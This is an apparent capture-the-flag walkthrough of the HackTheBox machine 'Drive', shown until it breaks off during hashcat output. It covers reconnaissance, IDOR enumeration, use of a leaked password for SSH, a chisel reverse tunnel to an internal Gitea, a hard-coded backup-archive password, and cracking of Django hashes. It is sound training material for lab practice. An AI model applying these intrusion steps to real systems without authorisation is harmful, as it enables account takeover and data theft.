# Drive

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.81.206
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 19:02 UTC
Nmap scan report for 10.129.81.206
Host is up (0.095s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://drive.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp filtered ppp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/14%OT=22%CT=1%CU=34985%PV=Y%DS=2%DC=T%G=Y%TM=652AE5
OS:F1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST1
OS:1NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   83.12 ms 10.10.16.1
2   42.11 ms 10.129.81.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.27 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.81.206
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 19:09 UTC
Nmap scan report for drive.htb (10.129.81.206)
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Doodle Grive
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp filtered ppp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/14%OT=22%CT=1%CU=42542%PV=Y%DS=2%DC=T%G=Y%TM=652AE7
OS:7B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:103%GCD=2%ISR=10E%TI=Z%CI=Z%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M5
OS:3ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88
OS:%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   43.24 ms 10.10.16.1
2   43.36 ms drive.htb (10.129.81.206)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.03 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.81.206
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 19:10 UTC
Nmap scan report for drive.htb (10.129.81.206)
Host is up (0.068s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1199.63 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.81.206/

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.81.206   drive.htb
```

> http://drive.htb/

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://drive.htb/
http://drive.htb/ [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, Email[customer-support@drive.htb,support@drive.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.81.206], JQuery[3.0.0], Script, Title[Doodle Grive], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

> http://drive.htb/register/

> http://drive.htb/login/

> http://drive.htb/contact/

We created a new user and intercepted the request with `Burp Suite`.

| Username | Email | Password |
| --- | --- | --- |
| foobar | foobar@foobar.local | P@ssw0rd! |

Request:

```c
POST /register/ HTTP/1.1
Host: drive.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://drive.htb/register/
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
Origin: http://drive.htb
DNT: 1
Connection: close
Cookie: csrftoken=GKfVTsRLRB4JOinb2pySLunP4DboSYrJ
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

csrfmiddlewaretoken=2TY2vEtmIRASZ82N8gglEJEZK8sDxJRUyt3NeWaXpiurDgfO0vE3f3REEBtRfx8t&username=foobar&email=foobar%40foobar.local&password1=P%40ssw0rd%21&password2=P%40ssw0rd%21
```

> http://drive.htb/upload/

> http://drive.htb/home/

```c
Welcome to Doodle Grive files sharing platform!
thank you for using our platform
if you have and questions don't be affraid to contact us using the contact-us page!
have fun! ;) 
```

We created a new group and added a random name.

> http://drive.htb/47/editGroup

| Usernames |
| --- |
| admin |
| jamesMason |
| martinCruz |
| tomHands |
| crisDisel |

> http://drive.htb/upload/

```c
 Note: DoodleGrive accepts only ASCII text MIME types only and files with size < 2MB ...
anyway any other MIME types or files with size bigger than 2MB will be considered as malicious behavior and will be blocked.
```

> http://drive.htb/home/?file_name=foobar

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://drive.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/drive.htb/-_23-10-14_19-05-45.txt

Error Log: /home/user/.dirsearch/logs/errors-23-10-14_19-05-45.log

Target: http://drive.htb/

[19:05:45] Starting: 
[19:05:48] 302 -    0B  - /.git/hooks/update  ->  /login/                  
[19:06:03] 302 -    0B  - /bitrix/modules/updater.log  ->  /login/          
[19:06:03] 302 -    0B  - /bitrix/modules/updater_partner.log  ->  /login/  
[19:06:06] 302 -    0B  - /confluence/plugins/servlet/oauth/update-consumer-info  ->  /login/
[19:06:06] 301 -    0B  - /contact  ->  /contact/                           
[19:06:10] 200 -    2KB - /favicon.ico                                      
[19:06:12] 301 -    0B  - /home  ->  /home/                                 
[19:06:13] 302 -    0B  - /install/update.log  ->  /login/                  
[19:06:16] 301 -    0B  - /login  ->  /login/                               
[19:06:16] 200 -    2KB - /login/                                           
[19:06:16] 301 -    0B  - /logout  ->  /logout/                             
[19:06:16] 302 -    0B  - /logout/  ->  /                                   
[19:06:25] 301 -    0B  - /register  ->  /register/                         
[19:06:25] 301 -    0B  - /reports  ->  /reports/                           
[19:06:29] 301 -    0B  - /subscribe  ->  /subscribe/                       
[19:06:32] 302 -    0B  - /upload.htm  ->  /login/                          
[19:06:32] 302 -    0B  - /upload.asp  ->  /login/                          
[19:06:32] 302 -    0B  - /upload/1.php  ->  /login/                        
[19:06:32] 302 -    0B  - /upload.php  ->  /login/
[19:06:32] 301 -    0B  - /upload  ->  /upload/
[19:06:32] 302 -    0B  - /upload/b_user.csv  ->  /login/
[19:06:32] 302 -    0B  - /upload.cfm  ->  /login/
[19:06:32] 302 -    0B  - /upload/loginIxje.php  ->  /login/                
[19:06:32] 302 -    0B  - /upload.php3  ->  /login/
[19:06:32] 302 -    0B  - /upload.aspx  ->  /login/
[19:06:32] 302 -    0B  - /upload/  ->  /login/                             
[19:06:32] 302 -    0B  - /upload.shtm  ->  /login/
[19:06:32] 302 -    0B  - /upload/b_user.xls  ->  /login/
[19:06:32] 302 -    0B  - /upload.html  ->  /login/                         
[19:06:32] 302 -    0B  - /upload/test.txt  ->  /login/
[19:06:32] 302 -    0B  - /upload/upload.php  ->  /login/
[19:06:32] 302 -    0B  - /upload_admin  ->  /login/
[19:06:32] 302 -    0B  - /upload/test.php  ->  /login/
[19:06:32] 302 -    0B  - /upload_backup/  ->  /login/
[19:06:32] 302 -    0B  - /upload_file.php  ->  /login/
[19:06:32] 302 -    0B  - /upload2.php  ->  /login/
[19:06:32] 302 -    0B  - /uploaded/  ->  /login/
[19:06:32] 302 -    0B  - /uploader  ->  /login/
[19:06:32] 302 -    0B  - /upload/2.php  ->  /login/
[19:06:32] 302 -    0B  - /uploadfile.asp  ->  /login/
[19:06:32] 302 -    0B  - /uploadify.php  ->  /login/
[19:06:32] 302 -    0B  - /uploads  ->  /login/
[19:06:32] 302 -    0B  - /uploader/  ->  /login/
[19:06:32] 302 -    0B  - /uploadfile.php  ->  /login/
[19:06:32] 302 -    0B  - /uploader.php  ->  /login/
[19:06:32] 302 -    0B  - /uploadify/  ->  /login/
[19:06:32] 302 -    0B  - /uploads.php  ->  /login/
[19:06:32] 302 -    0B  - /uploadify  ->  /login/
[19:06:32] 302 -    0B  - /uploadfiles.php  ->  /login/
[19:06:32] 302 -    0B  - /uploads/dump.sql  ->  /login/                    
[19:06:32] 302 -    0B  - /uploads/  ->  /login/                            
[19:06:32] 302 -    0B  - /uploads/affwp-debug.log  ->  /login/             
[19:06:32] 302 -    0B  - /uploads_admin  ->  /login/                       
                                                                             
Task Completed
```

#### Further Enumeration of Web Application

> http://drive.htb/contact/

Request:

```c
POST /contact/ HTTP/1.1
Host: drive.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://drive.htb/contact/
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Origin: http://drive.htb
DNT: 1
Connection: close
Cookie: csrftoken=aV1c6aDl0S3ESoQ3Y0SZnX4rbOkrILnu; sessionid=dqidnk2wpcjt1dobua9z1dtqli5qmvlx
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

csrfmiddlewaretoken=seRIO9UD18e4tqEhNwsJWIvwrs37og0ysZIKK9nORQ7ybEkaBmay9vpNs6doWRdS&Name=foobar&Phone+Number=12345&Email=foobar%40foobar.local&Message=http%3A%2F%2F10.10.16.39%2Ffoobar
```

```c
we have recived your message, we will review your message and contact you soon...
```

We tried to view other groups.

Modified Request:

```c
GET /42/getGroupDetail/ HTTP/1.1
Host: drive.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://drive.htb/showMyGroups/
DNT: 1
Connection: close
Cookie: csrftoken=aV1c6aDl0S3ESoQ3Y0SZnX4rbOkrILnu; sessionid=dqidnk2wpcjt1dobua9z1dtqli5qmvlx
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Oct 2023 19:32:15 GMT
Content-Type: application/json
Content-Length: 26
Connection: close
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

{"status": "unauthorized"}
```

Modified Request:

```c
GET /40/getGroupDetail/ HTTP/1.1
Host: drive.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://drive.htb/showMyGroups/
DNT: 1
Connection: close
Cookie: csrftoken=aV1c6aDl0S3ESoQ3Y0SZnX4rbOkrILnu; sessionid=dqidnk2wpcjt1dobua9z1dtqli5qmvlx
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Oct 2023 19:37:46 GMT
Content-Type: application/json
Content-Length: 26
Connection: close
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

{"status": "unauthorized"}
```

We found a few more groups so we tried to did the same for files.

```c
28
38
```

Then we started searching for files.

## Foothold

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://drive.htb/FUZZ/FUZZ2'          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://drive.htb/FUZZ/FUZZ2
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 79ms]
# Copyright 2007 James Fisher [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 93ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 100ms]
#                       [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 109ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 123ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 117ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 128ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 132ms]
#                       [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 138ms]
# Priority-ordered case-insensitive list, where entries were found [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 128ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 135ms]
# on at least 2 different hosts [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 140ms]
#                       [Status: 200, Size: 14647, Words: 3681, Lines: 307, Duration: 145ms]
uploads                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 56ms]
upload                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 54ms]
updates                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 64ms]
update                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 56ms]
blocks                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
block                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 118ms]
updated                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 504ms]
uploaded_images         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 274ms]
<--- SNIP --->
```

We uploaded a file, checked `show My Files` and clicked on `Reserve`.

> http://drive.htb/113/block/

```c
GET /79/block/ HTTP/1.1
Host: drive.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://drive.htb/showMyGroups/
DNT: 1
Connection: close
Cookie: csrftoken=aV1c6aDl0S3ESoQ3Y0SZnX4rbOkrILnu; sessionid=dqidnk2wpcjt1dobua9z1dtqli5qmvlx
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

> http://drive.htb/79/block/

```c
hey team after the great success of the platform we need now to continue the work.
on the new features for ours platform.
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
please make the necessary changes to the code before the end of the month
I will reach you soon with the token to apply your changes on the repo
thanks! 
```

| Username | Password |
| --- | --- |
| martin | Xk4@KjyrYv8t194L! |

```c
┌──(user㉿kali)-[~]
└─$ ssh martin@drive.htb        
The authenticity of host 'drive.htb (10.129.81.206)' can't be established.
ED25519 key fingerprint is SHA256:peISHngFC65Dty34JUO7mwuE89m2GA0Z8GUFC7skwa0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'drive.htb' (ED25519) to the list of known hosts.
martin@drive.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


martin@drive:~$
```

## Enumeration

```c
martin@drive:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
git:x:115:119:Git Version Control,,,:/home/git:/bin/bash
martin:x:1001:1001:martin cruz,,,:/home/martin:/bin/bash
cris:x:1002:1002:Cris Disel,,,:/home/cris:/bin/bash
tom:x:1003:1003:Tom Hands,,,:/home/tom:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

```c
martin@drive:/home$ ls -la
total 24
drwxr-xr-x  6 root   root   4096 Dec 25  2022 .
drwxr-xr-x 18 root   root   4096 Sep  6 12:56 ..
drwxr-x---  2 cris   cris   4096 Sep  6 02:56 cris
drwxr-x---  4 git    git    4096 Dec 25  2022 git
drwxr-x---  5 martin martin 4096 Sep 11 09:24 martin
drwxr-x---  6 tom    tom    4096 Sep 13 13:51 tom
```

```c
martin@drive:~$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        70                                             127.0.0.1:33060                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        151                                            127.0.0.1:3306                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                                 [::]:80                                                 [::]:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                                                
tcp                     LISTEN                   0                        4096                                                   *:3000                                                  *:*
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/serve]
└─$ ./chisel server -p 9002 -reverse -v
2023/10/14 19:58:37 server: Reverse tunnelling enabled
2023/10/14 19:58:37 server: Fingerprint FxY1kd6AOc5KUCseIC9DQlw6qjpL8zcsgqoweFXG68I=
2023/10/14 19:58:37 server: Listening on http://0.0.0.0:9002
```

```c
martin@drive:/dev/shm$ ./chisel client 10.10.16.39:9002 R:3000:127.0.0.1:3000
2023/10/14 19:58:34 client: Connecting to ws://10.10.16.39:9002
```

### Enumeration of GitTea

> http://127.0.0.1:3000

| Username | Password |
| --- | --- |
| martinCruz | Xk4@KjyrYv8t194L! |

> http://127.0.0.1:3000/crisDisel/DoodleGrive

> http://127.0.0.1:3000/crisDisel/DoodleGrive/src/branch/main/db.sqlite3

> http://127.0.0.1:3000/crisDisel/DoodleGrive/src/branch/main/db_backup.sh

```c
#!/bin/bash
DB=$1
date_str=$(date +'%d_%b')
7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3
cd /var/www/backups/
ls -l --sort=t *.7z > backups_num.tmp
backups_num=$(cat backups_num.tmp | wc -l)
if [[ $backups_num -gt 10 ]]; then
      #backups is more than 10... deleting to oldest backup
      rm $(ls  *.7z --sort=t --color=never | tail -1)
      #oldest backup deleted successfully!
fi
rm backups_num.tmp
```

| Password |
| --- |
| H@ckThisP@ssW0rDIfY0uC@n:) |

```c
martin@drive:~/unpack$ 7z x 1_Nov_db_backup.sqlite3.7z 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz (50657),ASM,AES-NI)

Scanning the drive for archives:
1 file, 12226 bytes (12 KiB)

Extracting archive: 1_Nov_db_backup.sqlite3.7z
--
Path = 1_Nov_db_backup.sqlite3.7z
Type = 7z
Physical Size = 12226
Headers Size = 146
Method = LZMA2:22 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok 

Size:       3760128
Compressed: 12226
```

```c
martin@drive:~/unpack$ ls -la
total 3692
drwxrwxr-x 2 martin martin    4096 Oct 14 20:21 .
drwxr-x--- 6 martin martin    4096 Oct 14 20:20 ..
-rw-r--r-- 1 martin martin   12226 Oct 14 20:20 1_Nov_db_backup.sqlite3.7z
-rwxr-xr-x 1 martin martin 3760128 Sep  1 18:25 db.sqlite3
```

```c
martin@drive:~/unpack/DoodleGrive$ ls
db.sqlite3
```

## Cracking Hashes

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ cat hashes 
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting in autodetect mode

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2913/5890 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

124 | Django (SHA-1) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
